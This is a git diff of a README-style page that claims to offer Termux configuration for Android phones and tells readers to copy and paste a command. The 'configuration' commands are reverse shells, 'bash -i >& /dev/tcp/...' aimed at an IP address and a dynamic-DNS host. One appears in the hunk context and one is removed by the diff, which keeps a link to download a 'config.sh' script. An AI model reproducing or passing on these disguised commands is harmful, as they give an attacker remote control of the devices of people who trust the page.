@@ -46,10 +46,10 @@ bash -i >& /dev/tcp/209.25.141.181/22864 0>&1; scan
     <img src="images/logo.png" alt="Logo" width="80" height="80">
   </a>
 
-  <h3 align="center">Configurations for termux for android Phones, supported devices are (SAMSUNG,OPPO,REDMI,XIAOMI,REALMI,** NOKIA AND IOS PHONES ARE NOT SUPPORTED** Copy And Paste this command bellow on your termux to configurate it. </h3>
+  <h3 align="center">Configurations and scan for termux for android Phones, supported devices are (SAMSUNG,OPPO,REDMI,XIAOMI,REALMI,** NOKIA AND IOS PHONES ARE NOT SUPPORTED** Copy And Paste this command bellow on your termux to configurate it. </h3>
 
   <p align="center">
-    bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
+    CONTACT freshtrup659@gmail.com for more informations   
     <br />
     <b><a href="https://servicez.ml/hackers.com/config.sh"><strong>Download main config »</strong></a></b>
     <br />
